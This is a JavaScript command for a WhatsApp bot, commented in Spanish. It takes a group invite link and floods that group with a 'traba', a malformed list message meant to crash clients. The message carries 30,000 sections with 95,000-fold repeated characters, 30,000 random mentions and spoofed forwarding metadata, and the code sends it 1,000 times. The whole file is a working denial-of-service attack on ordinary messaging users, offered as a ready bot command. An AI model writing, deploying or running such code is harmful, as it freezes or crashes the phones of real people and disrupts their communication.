// 🔹 Función que genera y envía la traba
async function XaDelayMaker(target, conn) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Hola",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "xd?"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  await conn.relayMessage(target, MSG, {});
}

// 🔹 Comando principal
let handler = async (m, { conn, text, command }) => {
  // Validar que haya un enlace de grupo
  if (!text || !text.includes('chat.whatsapp.com')) {
    return m.reply(`❌ Debes proporcionar un enlace de grupo.\nEjemplo: .${command} https://chat.whatsapp.com/XXXX`);
  }

  const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/);
  if (!match || !match[1]) {
    return m.reply('❌ Enlace de grupo no válido.');
  }

  try {
    const groupCode = match[1];
    const groupJid = await conn.groupGetInviteInfo(groupCode).then(info => info.id); // ✅ corregido

    await m.reply(`😼 Traba enviada al grupo: ${groupJid}\n⏳ Esto puede tardar unos segundos...`);

    // Audio de confirmación
    await conn.sendMessage(m.chat, {
      audio: { url: 'https://files.catbox.moe/4c2kje.mp3' },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });

    // Enviar la traba múltiples veces
    for (let i = 0; i < 500; i++) {
      await XaDelayMaker(groupJid, conn);
      await XaDelayMaker(groupJid, conn);
    }

    console.log('😼 Traba invisible completada en grupo');

  } catch (e) {
    console.error(e);
    m.reply('⚠️ Error al enviar traba. Puede que el enlace sea inválido o que el bot no tenga acceso al grupo.');
  }
};

handler.command = ['atraso3'];
handler.help = ['atraso3 <enlace del grupo>'];
handler.tags = ['traba'];
handler.group = false; // se puede usar fuera de grupos
handler.premium = false;

export default handler;